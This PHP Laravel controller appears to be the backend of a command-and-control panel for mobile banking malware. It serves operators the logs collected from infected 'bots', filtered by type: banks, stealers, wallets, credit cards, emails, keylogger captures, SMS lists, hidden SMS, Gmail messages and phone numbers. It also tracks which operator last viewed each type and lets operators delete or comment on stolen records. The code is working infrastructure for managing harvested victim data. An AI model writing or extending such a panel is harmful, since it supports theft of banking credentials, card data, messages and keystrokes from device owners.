<?php

namespace App\Http\Controllers;

use App\Helpers\ApiResponse;
use App\Http\Resources\BotLog\BotLogCollection;
use App\Http\Response\AccessDeniedResponse;
use App\Models\BotLog;
use App\Models\UserBotTimestamp;
use Carbon\Carbon;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Pagination\LengthAwarePaginator;
use Illuminate\Support\Collection;

class LogController extends Controller
{
    private array $ignoredTypes = ['application', 'gmail_mes', 'gmail_messages'];

    public function list(Request $request): JsonResponse
    {
        $this->validate($request, [
            'application' => 'string|nullable',
            'bot_id' => 'string|nullable',
            'type' => 'string|nullable',
            'per_page' => 'integer',
            'filters' => 'array',
            'filters.application' => 'string',
            'filters.query' => 'string',
            'sort' => 'array',
            'sort.field' => 'string|in:id,bot_id,application,created_at',
            'sort.by' => 'string|in:ascend,descend',
        ]);

        if (!in_array($request->get('type'), $this->ignoredTypes, true) && !auth()->user()?->can($request->get('type') . '.list')) {
            return AccessDeniedResponse::response();
        }

        $logs = BotLog::query();

        $user = auth()->user();

        if (!$user) {
            return ApiResponse::error();
        }

        $logs = $logs->join('bots', 'bot_logs.bot_id', '=', 'bots.id')
            ->select('bot_logs.*');

        if ($user->role !== 'root' || count($user->tagsNames)) {
            $logs->whereIn('bots.tag', $user->tagsNames);
        }

        if ($request->get('bot_id')) {
            $logs->where('bot_id', $request->get('bot_id'));
        }

        if ($request->get('application')) {
            $logs->where('application', $request->get('application'));
        }

        if ($request->get('type') && $request->get('type') !== 'application') {
            $logs->where('type', $request->get('type'));
        }

        if (in_array($request->get('type'), [
            'banks',
            'stealers',
            'crypt',
            'shops',
            'emails',
            'wallets',
            'credit_cards',
        ])) {
            $application = $request->get('filters')['application'] ?? null;
            $searchQuery = $request->get('filters')['query'] ?? null;

            $sortBy = $request->get('sort')['by'] ?? null;
            $sortField = $request->get('sort')['field'] ?? null;

            $logs = $logs->when(!empty($application), function ($query) use ($application) {
                $query->where('application', $application);
            })->when(!empty($searchQuery), function ($query) use ($searchQuery) {
                $query->where('log', 'LIKE', "%$searchQuery%");
            })->when(!empty($sortBy) && !empty($sortField), function ($query) use ($sortBy, $sortField) {
                if ($sortBy === "descend") {
                    $query->orderByDesc($sortField);
                } else {
                    $query->orderBy($sortField);
                }
            });
        } else {
            $logs = $logs->orderByDesc('created_at');
        }

        if (in_array($request->get('type'), ['pushlist', 'events', 'datakeylogger', 'smslist'])) {
            $logs = $logs->get();
        } elseif (in_array($request->get('type'), ['otheraccounts', 'phonenumber', 'applist'])) {
            $log = $logs->first();
            $logs = new Collection();
            if ($log) {
                $logs->add($log);
            }
        } elseif ($request->get('type') === 'events') {
            $logs = $logs->paginate($request->get('per_page', 20));
        } else {
            $logs = $logs->paginate($request->get('per_page', 15));
        }

        if (in_array($request->get('type'), [
            'banks',
            'stealers',
            'crypt',
            'shops',
            'emails',
            'wallets',
            'credit_cards',
        ])) {
            auth()->user()?->entitiesTimestamps?->update([
                $request->get('type') => Carbon::now()->toDateTimeString(),
            ]);
        }

        if ($request->get('type') === 'application') {
            $timestamp = UserBotTimestamp::firstOrNew([
                'user_id' => auth()->user()->id,
                'bot_id' => $request->get('bot_id'),
                'application' => $request->get('application'),
            ]);
            $timestamp->visited_at = Carbon::now()->toDateTimeString();
            $timestamp->save();
        }

        if (in_array($request->get('type'), ['pushlist', 'hidesms', 'smslist', 'datakeylogger'])) {
            $logsCollection = new Collection();

            foreach ($logs as $log) {
                if (in_array($request->get('type'), ['datakeylogger', 'smslist'])) {
                    $logsCollection = $logsCollection->merge($log->log);
                } else {
                    $logsCollection = $logsCollection->merge([$log->log]);
                }
            }

            if ($request->get('type') === 'datakeylogger') {
                $logsCollection = $logsCollection->unique()->sortByDesc(function ($item) {
                    return $item['time'];
                });

                if ($request->has('keyloggerAction')) {
                    $logsCollection = $logsCollection->filter(function ($item) use ($request) {
                        /* keyloggerActions: [Click], [KeyLog], [Write Text], [Focused], [Selected] */
                        return $item['action'] === $request->get('keyloggerAction');
                    });
                }
            }

            $logsCollection = $logsCollection->paginate($request->get('per_page'));

            if (isset($log)) {
                $log->log = $logsCollection->values();
                $logs = collect([$log]);
            } else {
                $logs = collect([]);
            }

            /** @var LengthAwarePaginator $logs */
            $array = $logsCollection->toArray();

            return new JsonResponse([
                "payload" => $logs,
                "success" => true,
                "keyloggerAction" => $request->get('keyloggerAction'),
                "meta" => [
                    "current_page" => $array['current_page'],
                    "per_page" => $array['per_page'],
                    "to" => $array['to'] ?? null,
                    "total" => $array['total']
                ],
            ]);
        }

        if (in_array($request->get('type'), ['gmail_mes', 'gmail_messages'])) {
            $logsCollection = new Collection();
            $eventLog = [];
            foreach ($logs as $log) {
                foreach ($log->log as $_log) {
                    $eventLog[] = array_map(function($var) {
                        return trim(mb_convert_encoding($var, "UTF-8"));
                    }, $_log);
                }
                $logsCollection = $logsCollection->merge($eventLog);
            }

            $log = $logs->first();

            if ($log) {
                $log->log = $logsCollection->unique()->take(20)->reverse()->toArray();
                $logs = collect([$log]);
            } else {
                $logs = collect([]);
            }

            $logs = $logs->paginate(15);
        }

        if ($request->get('type') === 'events') {
            $logsCollection = new Collection();
            $eventLog = [];
            foreach ($logs as $log) {
                foreach ($log->log as $_log) {
                    foreach ($_log as $key => $value) {
                        $eventLog[] = [
                            'eventName' => $key,
                            'value' => $value,
                            'bot_id' => $log->bot_id,
                        ];
                    }
                }
                $logsCollection = $logsCollection->merge($eventLog);
            }

            $log = $logs->first();

            if ($log) {
                $log->log = $logsCollection->unique()->take(20)->toArray();
                $logs = collect([$log]);
            } else {
                $logs = collect([]);
            }

            $logs = $logs->paginate(15);

            auth()->user()?->entitiesTimestamps?->update([
                'events' => Carbon::now()->toDateTimeString(),
            ]);
        }

        if (in_array($request->get('type'), ['otheraccounts', 'phonenumber', 'applist'])) {
            $logs = $logs->paginate(15);
        }

        return BotLogCollection::make($logs)->response();
    }

    public function delete(Request $request): ApiResponse
    {
        $this->validate($request, [
            'logIds' => 'array|required',
            'logIds.*' => 'exists:bot_logs,id',
        ]);

        $botLogs = BotLog::whereIn('id', $request->get('logIds'))->get();

        foreach ($botLogs as $botLog) {
            if (!in_array($botLog->type, $this->ignoredTypes, true) && !auth()->user()?->can($botLog->type . '.delete')) {
                return AccessDeniedResponse::response();
            }
        }

        BotLog::whereIn('id', $request->get('logIds'))->delete();

        return ApiResponse::success([
            'logIds' => $request->get('logIds'),
        ]);
    }

    public function editComment(Request $request): ApiResponse
    {
        $this->validate($request, [
            'comment' => 'string|nullable',
            'logIds' => 'array|required',
            'logIds.*' => 'exists:bot_logs,id',
        ]);

        $botLogs = BotLog::whereIn('id', $request->get('logIds'))->get();

        foreach ($botLogs as $botLog) {
            if (!in_array($botLog->type, $this->ignoredTypes, true) && !auth()->user()?->can($botLog->type . '.editComment')) {
                return AccessDeniedResponse::response();
            }
        }

        BotLog::whereIn('id', $request->get('logIds'))->update([
            'comment' => $request->get('comment'),
        ]);

        return ApiResponse::success([
            'logIds' => $request->get('logIds'),
            'comment' => $request->get('comment'),
        ]);
    }
}